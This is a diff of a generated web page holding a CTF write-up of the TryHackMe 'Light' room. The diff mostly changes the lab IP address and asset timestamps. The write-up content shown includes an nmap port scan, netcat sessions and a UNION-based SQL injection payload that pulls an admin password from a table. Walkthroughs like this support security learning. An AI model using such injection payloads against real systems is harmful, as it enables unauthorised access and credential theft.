@@ -5,17 +5,17 @@
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
     <meta name="generator" content="Hugo 0.134.3">
     <meta name="generator" content="Relearn 6.4.0+tip">
-    <meta name="description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+    <meta name="description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.147.110 1337 You can use the username smokey in order to get started.
 Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
     <meta name="author" content="Roger C.B. Johnsen">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Light - Predefender Cyber Hunting">
-    <meta name="twitter:description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+    <meta name="twitter:description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.147.110 1337 You can use the username smokey in order to get started.
 Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
     <meta property="og:url" content="http://localhost:1313/ctf/tryhackme/light/index.html">
     <meta property="og:site_name" content="Predefender Cyber Hunting">
     <meta property="og:title" content="Light - Predefender Cyber Hunting">
-    <meta property="og:description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+    <meta property="og:description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.147.110 1337 You can use the username smokey in order to get started.
 Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
     <meta property="og:locale" content="en_us">
     <meta property="og:type" content="article">
@@ -26,25 +26,25 @@ Note: Please allow the service 2 - 3 minutes to fully start before connecting to
     <meta property="article:tag" content="Writeup">
     <meta property="article:tag" content="Tryhackme">
     <meta itemprop="name" content="Light - Predefender Cyber Hunting">
-    <meta itemprop="description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337 You can use the username smokey in order to get started.
+    <meta itemprop="description" content="Revised Date Author Comment 19.01.2025 Roger Johnsen Article added Introduction I am working on a database application called Light! Would you like to try it out? If so, the application is running on port 1337. You can connect to it using nc 10.10.147.110 1337 You can use the username smokey in order to get started.
 Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.">
     <meta itemprop="datePublished" content="2025-01-18T09:36:24+01:00">
     <meta itemprop="dateModified" content="2025-01-18T09:36:24+01:00">
-    <meta itemprop="wordCount" content="773">
+    <meta itemprop="wordCount" content="772">
     <meta itemprop="keywords" content="Ctf,Writeup,Tryhackme">
     <title>Light - Predefender Cyber Hunting</title>
 
-    <link href="/css/fontawesome-all.min.css?1737286514" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1737286514" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1737286514" rel="stylesheet">
-    <link href="/css/auto-complete.css?1737286514" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1737286514" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1737286514" rel="stylesheet">
-    <link href="/css/fonts.css?1737286514" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1737286514" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1737286514" rel="stylesheet">
-    <link href="/css/theme-predefender.css?1737286514" rel="stylesheet" id="R-variant-style">
-    <link href="/css/chroma-relearn-light.css?1737286514" rel="stylesheet" id="R-variant-chroma-style">
-    <link href="/css/variant.css?1737286514" rel="stylesheet">
-    <link href="/css/print.css?1737286514" rel="stylesheet" media="print">
-    <script src="/js/variant.js?1737286514"></script>
+    <link href="/css/fontawesome-all.min.css?1737286745" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1737286745" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1737286745" rel="stylesheet">
+    <link href="/css/auto-complete.css?1737286745" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1737286745" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1737286745" rel="stylesheet">
+    <link href="/css/fonts.css?1737286745" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1737286745" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1737286745" rel="stylesheet">
+    <link href="/css/theme-predefender.css?1737286745" rel="stylesheet" id="R-variant-style">
+    <link href="/css/chroma-relearn-light.css?1737286745" rel="stylesheet" id="R-variant-chroma-style">
+    <link href="/css/variant.css?1737286745" rel="stylesheet">
+    <link href="/css/print.css?1737286745" rel="stylesheet" media="print">
+    <script src="/js/variant.js?1737286745"></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.relBasePath='..\/..\/..';
@@ -148,7 +148,7 @@ Note: Please allow the service 2 - 3 minutes to fully start before connecting to
 <h2 id="introduction">Introduction</h2>
 <blockquote>
 <p><em>I am working on a database application called Light! Would you like to try it out?
-If so, the application is running on port 1337. You can connect to it using nc 10.10.199.201 1337
+If so, the application is running on port 1337. You can connect to it using nc 10.10.147.110 1337
 You can use the username smokey in order to get started.</em></p>
 <p><em>Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.</em></p>
 </blockquote>
@@ -156,17 +156,17 @@ You can use the username smokey in order to get started.</em></p>
 </p>
 <hr>
 <h2 id="portscanning">Portscanning</h2>
-<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -Pn -p- 10.10.199.201 -oN scan.txt
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -Pn -p- 10.10.147.110 -oN scan.txt
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Sat Jan 18 12:34:04 2025 as: /usr/lib/nmap/nmap --privileged -sS -Pn -p- -oN scan.txt 10.10.199.201</span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.199.201
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Sat Jan 18 12:34:04 2025 as: /usr/lib/nmap/nmap --privileged -sS -Pn -p- -oN scan.txt 10.10.147.110</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.147.110
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.059s latency<span style="color:#f92672">)</span>.
 </span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>22/tcp   open  ssh
 </span></span><span style="display:flex;"><span>1337/tcp open  waste</span></span></code></pre></div>
 <h2 id="enumerating-service">Enumerating service</h2>
-<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.199.201 <span style="color:#ae81ff">1337</span>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.147.110 <span style="color:#ae81ff">1337</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Welcome to the Light database!
 </span></span><span style="display:flex;"><span>Please enter your username: smokey
@@ -182,7 +182,7 @@ You can use the username smokey in order to get started.</em></p>
 <li>Inserting a single quotation mark (<code>'</code>) results in an SQL error.</li>
 <li>Input filtering appears to be in place.</li>
 </ul>
-<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.199.201 <span style="color:#ae81ff">1337</span>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.147.110 <span style="color:#ae81ff">1337</span>
 </span></span><span style="display:flex;"><span>Welcome to the Light database!
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Please enter your username: 
@@ -250,8 +250,7 @@ You can use the username smokey in order to get started.</em></p>
 </span></span><span style="display:flex;"><span>Username not found.
 </span></span><span style="display:flex;"><span>Please enter your username:</span></span></code></pre></div>
 <p>Although we can extract the username, we cannot retrieve the password by simply entering the username at the prompt. However, we must use SQL injection once again:</p>
-<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">```</span><span style="color:#66d9ef">sql</span>
-</span></span><span style="display:flex;"><span>x<span style="color:#e6db74">&#39; Union Select password FROM admintable WHERE username like &#39;</span>T<span style="color:#f92672">%</span></span></span></code></pre></div>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>x<span style="color:#e6db74">&#39; Union Select password FROM admintable WHERE username like &#39;</span>T<span style="color:#f92672">%</span></span></span></code></pre></div>
 <p>Putting this into practice:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.147.110 <span style="color:#ae81ff">1337</span>
 </span></span><span style="display:flex;"><span>
@@ -354,23 +353,23 @@ You can use the username smokey in order to get started.</em></p>
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1737286514" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-color.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1737286514" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1737286514" defer></script>
-    <script src="/js/js-yaml.min.js?1737286514" defer></script>
-    <script src="/js/mermaid.min.js?1737286514" defer></script>
+    <script src="/js/clipboard.min.js?1737286745" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-color.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1737286745" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1737286745" defer></script>
+    <script src="/js/js-yaml.min.js?1737286745" defer></script>
+    <script src="/js/mermaid.min.js?1737286745" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{}");
     </script>
-    <script src="/js/theme.js?1737286514" defer></script>
+    <script src="/js/theme.js?1737286745" defer></script>
     <script src="https://cdn.counter.dev/script.js" data-id="f2222025-310f-4c96-9abb-aee09ff8d01f" data-utcoffset="2"></script>
   </body>
 </html>
